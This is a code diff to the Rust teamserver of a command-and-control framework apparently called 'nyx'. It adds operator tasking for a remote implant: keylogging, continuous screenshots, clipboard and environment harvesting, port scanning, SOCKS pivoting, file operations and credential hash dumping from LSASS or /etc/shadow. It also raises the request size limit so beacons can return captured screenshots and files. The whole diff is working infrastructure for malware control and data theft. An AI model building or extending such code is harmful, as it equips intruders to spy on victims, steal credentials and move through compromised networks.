@@ -35,7 +35,7 @@ use axum::{
 };
 use dashmap::DashMap;
 use nyx_protocol::{
-    encode_frame_dir, open_frame, parse_frame, wire::Reader, Command, Direction,
+    encode_frame_dir, open_frame, parse_frame, wire::Reader, Command, Direction, FileOp,
     Response as MsgResponse,
     ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
 };
@@ -162,6 +162,9 @@ fn response_event_kind(r: &MsgResponse) -> (nyx_scripting::ResultKind, String) {
         MsgResponse::Channel { chan, .. } => {
             (nyx_scripting::ResultKind::Other, format!("<chan {chan}>"))
         }
+        MsgResponse::Image(d) => {
+            (nyx_scripting::ResultKind::Other, format!("<screenshot {} bytes>", d.len()))
+        }
     }
 }
 
@@ -278,9 +281,11 @@ pub fn router(state: Arc<AppState>) -> Router {
     // Hard cap on request body size, applied router-wide so it covers BOTH the
     // axum::serve path (which has its own 2 MiB default for extractors) AND the
     // raw-TLS `serve_connection` path in main.rs (which has NO default limit).
-    // 512 KiB is generously above any real beacon frame (ct cap is 256 KiB) but
-    // blocks the multi-GB-buffering OOM vector.
-    r.layer(DefaultBodyLimit::max(512 * 1024)).with_state(state)
+    // 4 MiB allows chunked screenshot/file responses while still blocking the
+    // multi-GB-buffering OOM vector. Each encrypted frame is capped at 256 KiB
+    // (MAX_CT_LEN), but a single beacon check-in POST can carry multiple frames
+    // (e.g. a 1 MB screenshot split into 128 KiB FileChunks).
+    r.layer(DefaultBodyLimit::max(4 * 1024 * 1024)).with_state(state)
 }
 
 // ---- implant endpoint ------------------------------------------------------
@@ -361,6 +366,7 @@ fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
         Some(nyx_profile::Terminator::Parameter(_))
         | Some(nyx_profile::Terminator::UriAppend) => {
             // The transformed bytes belong in the body for the response path.
+            #[allow(clippy::collapsible_match)]
             if !extra.is_empty() {
                 resp = (StatusCode::OK, body_bytes(extra)).into_response();
                 // Re-apply static headers (the body swap dropped them).
@@ -650,7 +656,49 @@ enum JsonCommand {
         args: Vec<String>,
         data_hex: String,
     },
+    /// 文件系统操作：op ∈ {cd,mkdir,rm,mv,cp}，dest 仅 mv/cp 需要。
+    FileOp {
+        op: String,
+        path: String,
+        dest: Option<String>,
+    },
+    /// 打开出站连接（P2P / rportfwd）。chan 由 server 分配。
+    Connect {
+        host: String,
+        port: u16,
+    },
+    /// SOCKS5 中继控制。
+    Socks {
+        chan: u32,
+        op: u8,
+        addr: String,
+        port: u16,
+    },
+    /// 截屏。monitor 0=主屏。
+    Screenshot { monitor: u8 },
+    /// 端口扫描。
+    Portscan { host: String, ports: String },
+    /// 网络信息收集。
+    Net { query: String },
+    /// 磁盘信息。
+    Driveinfo,
+    /// 剪贴板。
+    Clipboard,
+    /// 环境变量。name 空串=全部。
+    Env { name: String },
+    /// 键盘记录。action 0=start 1=stop 2=dump。
+    Keylog { action: u8 },
+    /// 持续截屏。
+    Screenwatch { interval_secs: u32 },
+    /// 凭据哈希提取。method 0=LSASS 1=shadow。
+    Hashdump { method: u8 },
     Exit,
+}
+
+/// Connect channel id 分配器（模块级原子计数器）。
+static CHAN_SEQ: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(1);
+fn next_chan() -> u32 {
+    CHAN_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
 }
 
 impl JsonCommand {
@@ -674,6 +722,37 @@ impl JsonCommand {
                 let blob = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                 Command::Bof { name, args, blob }
             }
+            JsonCommand::FileOp { op, path, dest } => {
+                let fileop = match op.as_str() {
+                    "cd" => FileOp::Cd,
+                    "mkdir" => FileOp::Mkdir,
+                    "rm" => FileOp::Rm,
+                    "mv" => FileOp::Mv,
+                    "cp" => FileOp::Cp,
+                    _ => return Err("bad file op"),
+                };
+                Command::FileOp { op: fileop, path, dest }
+            }
+            JsonCommand::Connect { host, port } => {
+                Command::Connect {
+                    proto: 0, // TCP
+                    host,
+                    port,
+                    chan: next_chan(),
+                }
+            }
+            JsonCommand::Socks { chan, op, addr, port } => {
+                Command::Socks { chan, op, addr, port }
+            }
+            JsonCommand::Screenshot { monitor } => Command::Screenshot { monitor },
+            JsonCommand::Portscan { host, ports } => Command::Portscan { host, ports },
+            JsonCommand::Net { query } => Command::Net { query },
+            JsonCommand::Driveinfo => Command::DriveInfo,
+            JsonCommand::Clipboard => Command::Clipboard,
+            JsonCommand::Env { name } => Command::Env { name },
+            JsonCommand::Keylog { action } => Command::Keylog { action },
+            JsonCommand::Screenwatch { interval_secs } => Command::Screenwatch { interval_secs },
+            JsonCommand::Hashdump { method } => Command::Hashdump { method },
             JsonCommand::Exit => Command::Exit,
         })
     }
@@ -682,6 +761,10 @@ impl JsonCommand {
 #[derive(Serialize)]
 struct TaskAck {
     task_id: u64,
+    /// 对 Connect 命令，server 分配的 channel id（操作员用它发后续 /socks）。
+    /// 其他命令为 None。
+    #[serde(skip_serializing_if = "Option::is_none")]
+    chan: Option<u32>,
 }
 
 fn parse_session_hex(s: &str) -> Option<SessionId> {
@@ -730,8 +813,13 @@ async fn post_task(
     }
     let task_id = s.next_task_id;
     s.next_task_id += 1;
+    // 如果是 Connect，把 server 分配的 chan 回传给操作员（供后续 /socks 用）。
+    let chan = match &command {
+        Command::Connect { chan, .. } => Some(*chan),
+        _ => None,
+    };
     s.pending.push(Task { task_id, command });
-    (StatusCode::OK, Json(TaskAck { task_id })).into_response()
+    (StatusCode::OK, Json(TaskAck { task_id, chan })).into_response()
 }
 
 #[derive(Deserialize)]
@@ -795,6 +883,13 @@ async fn get_results(
                     None,
                     None,
                 ),
+                MsgResponse::Image(d) => (
+                    "image",
+                    format!("<screenshot {} bytes>", d.len()),
+                    Some(hex::encode(&d)),
+                    None,
+                    None,
+                ),
             };
             ResultView {
                 task_id: r.task_id,
@@ -820,6 +915,16 @@ fn command_name(c: &Command) -> &'static str {
         Command::Bof { .. } => "bof",
         Command::Connect { .. } => "connect",
         Command::Socks { .. } => "socks",
+        Command::FileOp { .. } => "fileop",
+        Command::Screenshot { .. } => "screenshot",
+        Command::Portscan { .. } => "portscan",
+        Command::Net { .. } => "net",
+        Command::DriveInfo => "driveinfo",
+        Command::Clipboard => "clipboard",
+        Command::Env { .. } => "env",
+        Command::Keylog { .. } => "keylog",
+        Command::Screenwatch { .. } => "screenwatch",
+        Command::Hashdump { .. } => "hashdump",
         Command::Exit => "exit",
     }
 }
@@ -1006,7 +1111,7 @@ mod tests {
         // length difference > 255 must NOT collide with equal-length via a
         // truncated low-byte length check (regression for an earlier impl that
         // did `(a.len() ^ b.len()) as u8`, where 256 xor 0 → 0).
-        assert!(!eq(&vec![0u8; 256], &vec![0u8; 0]));
+        assert!(!eq(&vec![0u8; 256], &[] as &[u8]));
         assert!(!eq(&vec![0u8; 512], &vec![0u8; 256]));
         // same length, every single-byte difference must be detected
         for i in 0..32u8 {
@@ -1017,5 +1122,70 @@ mod tests {
             b[i as usize] = 1;
             assert!(eq(&a, &b), "re-equalized at byte {i} must compare equal");
         }
+    }
+
+    // ---- JsonCommand → Command 映射（FileOp / Connect / Socks）----
+
+    #[test]
+    fn fileop_mkdir_maps() {
+        let cmd = JsonCommand::FileOp {
+            op: "mkdir".into(),
+            path: "/tmp/x".into(),
+            dest: None,
+        }
+        .into_command()
+        .expect("mkdir 应映射成功");
+        assert!(matches!(
+            cmd,
+            Command::FileOp { op: FileOp::Mkdir, .. }
+        ));
+    }
+
+    #[test]
+    fn fileop_mv_maps_with_dest() {
+        let cmd = JsonCommand::FileOp {
+            op: "mv".into(),
+            path: "a".into(),
+            dest: Some("b".into()),
+        }
+        .into_command()
+        .unwrap();
+        assert!(matches!(
+            cmd,
+            Command::FileOp { op: FileOp::Mv, path, dest: Some(_) } if path == "a"
+        ));
+    }
+
+    #[test]
+    fn fileop_bad_op_errors() {
+        assert!(matches!(
+            JsonCommand::FileOp { op: "wat".into(), path: "x".into(), dest: None }.into_command(),
+            Err("bad file op")
+        ));
+    }
+
+    #[test]
+    fn connect_maps_with_chan() {
+        let cmd = JsonCommand::Connect { host: "10.0.0.1".into(), port: 445 }
+            .into_command()
+            .unwrap();
+        match cmd {
+            Command::Connect { host, port, chan, .. } => {
+                assert_eq!(host, "10.0.0.1");
+                assert_eq!(port, 445);
+                assert!(chan > 0, "chan 必须由 server 分配，>0");
+            }
+            _ => panic!("应为 Connect"),
+        }
+    }
+
+    #[test]
+    fn socks_maps_passthrough() {
+        let cmd = JsonCommand::Socks {
+            chan: 5, op: 1, addr: "1.2.3.4".into(), port: 80,
+        }
+        .into_command()
+        .unwrap();
+        assert!(matches!(cmd, Command::Socks { chan: 5, op: 1, .. }));
     }
 }
